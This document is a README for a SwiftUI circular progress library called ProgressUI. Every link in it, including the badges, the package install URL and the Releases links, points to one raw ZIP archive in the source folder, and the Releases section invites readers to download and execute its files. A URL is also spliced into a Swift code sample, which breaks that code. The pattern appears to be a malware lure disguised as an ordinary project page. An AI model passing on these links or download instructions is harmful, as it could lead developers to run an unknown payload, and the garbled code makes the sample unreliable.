# ProgressUI 🌟

![ProgressUI](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip)
![SwiftUI](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip)
![SPM](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip)

Welcome to the **ProgressUI** repository! This project features a highly customizable and animated circular progress indicator designed specifically for SwiftUI. Whether you need a simple spinner or a more complex progress display, ProgressUI provides the flexibility and functionality you need.

## Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Usage](#usage)
4. [Customization](#customization)
5. [Examples](#examples)
6. [Contributing](#contributing)
7. [License](#license)
8. [Releases](#releases)

## Features

- **Customizable Appearance**: Change colors, sizes, and styles easily.
- **Dynamic Coloring**: Adjust colors based on progress values.
- **Spinner Mode**: Use a spinner for loading indicators.
- **Multiple Sizes**: Choose from various sizes to fit your design.
- **Easy Integration**: Simple to add to your SwiftUI project.

## Installation

You can add ProgressUI to your project using Swift Package Manager. Follow these steps:

1. Open your project in Xcode.
2. Navigate to **File > Swift Packages > Add Package Dependency**.
3. Enter the repository URL: `https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip`.
4. Choose the version you want to install.

For detailed installation instructions, visit the [Releases](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip) section.

## Usage

Using ProgressUI is straightforward. Here's a simple example:

```swift
import SwiftUI
import ProgressUI

struct ContentView: View {
    @State private var progress: CGFloat = 0.5

    var body: some View {
        VStack {
            CircularProgressView(progress: progress)
                .frame(width: 100, height: 100)
                .padding()
            
            Slider(value: $progress, in: 0...1)
                .padding()
        }
    }
}
```

This example shows a circular progress view with a slider to control the progress. Adjust the `progress` variable to see the indicator change in real-time.

## Customization

ProgressUI offers various customization options. Here are some key properties you can modify:

- **Color**: Set the color of the progress indicator.
- **Line Width**: Adjust the thickness of the circular line.
- **Animation Duration**: Change how fast the progress updates.
- **Size**: Modify the overall size of the progress view.

### Example of Customization

```swift
CircularProgressView(progress: progress)
    .stroke(https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip, lineWidth: 8)
    .animation(.easeInOut(duration: 1.0))
```

## Examples

Here are some examples of how to use ProgressUI in different scenarios:

### Basic Circular Progress

```swift
CircularProgressView(progress: 0.75)
    .frame(width: 100, height: 100)
```

### Spinner Mode

```swift
SpinnerView()
    .frame(width: 50, height: 50)
```

### Dynamic Color Change

```swift
CircularProgressView(progress: progress)
    .foregroundColor(progress < 0.5 ? .red : .green)
```

## Contributing

We welcome contributions to ProgressUI! If you'd like to help, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature-branch`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add new feature'`).
5. Push to the branch (`git push origin feature-branch`).
6. Create a new Pull Request.

Please ensure your code adheres to the existing style and includes tests where applicable.

## License

ProgressUI is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Releases

To download the latest version of ProgressUI, visit the [Releases](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip) section. Here, you can find the necessary files to download and execute.

Feel free to explore the repository, report issues, or suggest features. Your feedback is valuable to us!

## Contact

For any questions or suggestions, please open an issue in the repository or contact the maintainer directly.

---

Thank you for checking out ProgressUI! We hope it meets your needs for creating beautiful and functional progress indicators in your SwiftUI applications.